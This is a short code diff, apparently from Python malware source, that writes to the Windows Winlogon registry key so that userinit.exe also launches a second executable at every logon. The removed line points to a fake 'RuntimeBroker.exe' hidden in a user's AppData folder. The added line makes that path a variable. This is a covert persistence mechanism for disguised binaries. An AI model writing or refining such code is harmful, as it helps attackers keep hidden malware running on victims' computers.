@@ -134,7 +134,7 @@ try {
         import winreg
         
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, 'C:\\Windows\\system32\\userinit.exe,"C:\\Users\\Arman\\AppData\\Local\\Microsoft\\Windows\\Explorer\\RuntimeBroker.exe"')
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'C:\\Windows\\system32\\userinit.exe,"{path}"')
         winreg.CloseKey(key)
 
 
